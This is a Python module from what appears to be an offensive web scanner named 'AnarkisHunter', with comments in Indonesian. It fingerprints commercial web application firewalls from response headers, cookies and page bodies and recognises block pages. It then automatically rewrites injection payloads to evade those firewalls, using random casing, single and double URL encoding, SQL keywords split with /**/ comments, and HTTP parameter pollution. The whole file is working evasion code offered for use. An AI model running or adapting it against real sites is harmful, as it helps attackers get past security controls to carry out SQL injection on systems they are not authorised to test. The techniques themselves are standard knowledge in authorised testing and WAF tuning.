"""
AnarkisHunter — utils_waf_bypass.py
=====================================
WAF detection dan automatic bypass transformations:
- Case variation (SeLeCt)
- URL encoding (%27, %2527)
- Comment injection (SE/**/LECT)
- HTTP parameter pollution
"""

import random
import re
from typing import List, Dict, Optional, Tuple
from urllib.parse import quote, quote_plus, urlparse, parse_qsl, urlencode, urlunparse


WAF_SIGNATURES = {
    "Cloudflare": ["cloudflare", "__cfduid", "cf-ray", "cf-request-id", "cf-cache-status"],
    "ModSecurity": ["mod_security", "modsecurity", "noyb", "mod_security/"],
    "Akamai": ["akamai", "x-akamai-transformed", "akamaighost", "akamai-origin-hop"],
    "AWS WAF": ["awswaf", "x-amzn-requestid", "x-amz-cf-id", "x-amzn-trace-id"],
    "Sucuri": ["sucuri", "x-sucuri-id", "x-sucuri-cache"],
    "Incapsula": ["incapsula", "visid_incap", "incap_ses", "incapsula incident"],
    "F5 BIG-IP": ["bigipserver", "x-wa-info", "x-cnection"],
    "Barracuda": ["barracuda", "barra_counter_session"],
    "Wordfence": ["wordfence", "wfvt_"],
    "Imperva": ["imperva", "x-iinfo", "incap"],
}

BLOCK_INDICATORS = [
    "blocked", "forbidden", "access denied", "security violation",
    "wafprotection", "modsecurity", "request rejected", "not acceptable",
    "attention required", "captcha", "challenge-platform",
]


class WAFBypass:
    """WAF detection dan payload bypass engine."""

    def __init__(self):
        self.detected_wafs: List[str] = []
        self.bypass_mode: bool = False

    def detect_from_response(self, resp) -> List[str]:
        """Deteksi WAF dari HTTP response."""
        if not resp:
            return []

        detected = []
        headers_str = " ".join(f"{k}:{v}" for k, v in resp.headers.items()).lower()
        cookies_str = " ".join(str(c) for c in resp.cookies).lower() if hasattr(resp, "cookies") else ""
        body_low = (resp.text if hasattr(resp, "text") else "")[:5000].lower()
        haystack = headers_str + " " + cookies_str + " " + body_low

        for waf_name, signatures in WAF_SIGNATURES.items():
            for sig in signatures:
                if sig.lower() in haystack:
                    if waf_name not in detected:
                        detected.append(waf_name)
                    break

        for w in detected:
            if w not in self.detected_wafs:
                self.detected_wafs.append(w)

        if detected:
            self.bypass_mode = True

        return detected

    def is_blocked(self, resp) -> bool:
        """Cek apakah response menandakan request di-block WAF."""
        if not resp:
            return True
        if resp.status_code in {403, 406, 419, 429, 503}:
            return True
        body_low = (resp.text if hasattr(resp, "text") else "")[:3000].lower()
        return any(ind in body_low for ind in BLOCK_INDICATORS)

    def case_variation(self, payload: str) -> str:
        """Random case variation: SeLeCt."""
        return "".join(
            c.upper() if random.random() > 0.5 else c.lower()
            for c in payload
        )

    def url_encode(self, payload: str, double: bool = False) -> str:
        """URL encoding: %27 atau %2527 (double)."""
        encoded = quote(payload, safe="")
        if double:
            encoded = quote(encoded, safe="")
        return encoded

    def comment_injection(self, payload: str) -> str:
        """SQL comment injection: SE/**/LECT."""
        keywords = ["SELECT", "UNION", "INSERT", "UPDATE", "DELETE", "DROP",
                    "OR", "AND", "FROM", "WHERE", "SLEEP", "WAITFOR"]
        result = payload
        for kw in keywords:
            if kw.upper() in result.upper():
                idx = result.upper().find(kw.upper())
                if idx >= 0:
                    mid = idx + len(kw) // 2
                    result = result[:mid] + "/**/" + result[mid:]
        return result

    def hpp_payload(self, url: str, param: str, payload: str) -> str:
        """HTTP Parameter Pollution: duplikasi parameter."""
        parsed = urlparse(url)
        params = parse_qsl(parsed.query, keep_blank_values=True)
        new_params = [(param, "safe_value"), (param, payload)]
        for k, v in params:
            if k != param:
                new_params.append((k, v))
        new_query = urlencode(new_params)
        return urlunparse(parsed._replace(query=new_query))

    def generate_bypass_variants(self, payload: str, url: str = "", param: str = "") -> List[Dict[str, str]]:
        """Generate semua variant bypass untuk satu payload."""
        variants = [{"payload": payload, "technique": "original"}]

        if self.bypass_mode:
            variants.extend([
                {"payload": self.case_variation(payload), "technique": "case_variation"},
                {"payload": self.url_encode(payload), "technique": "url_encode"},
                {"payload": self.url_encode(payload, double=True), "technique": "double_url_encode"},
                {"payload": self.comment_injection(payload), "technique": "comment_injection"},
            ])
            if url and param:
                variants.append({
                    "payload": payload,
                    "technique": "hpp",
                    "url": self.hpp_payload(url, param, payload),
                })

        return variants

    def get_status_display(self) -> str:
        """String untuk ditampilkan di output."""
        if not self.detected_wafs:
            return "No WAF detected"
        wafs = ", ".join(self.detected_wafs)
        mode = " [BYPASS MODE ACTIVE]" if self.bypass_mode else ""
        return f"WAF Detected: {wafs}{mode}"


# Singleton instance
waf_bypass = WAFBypass()
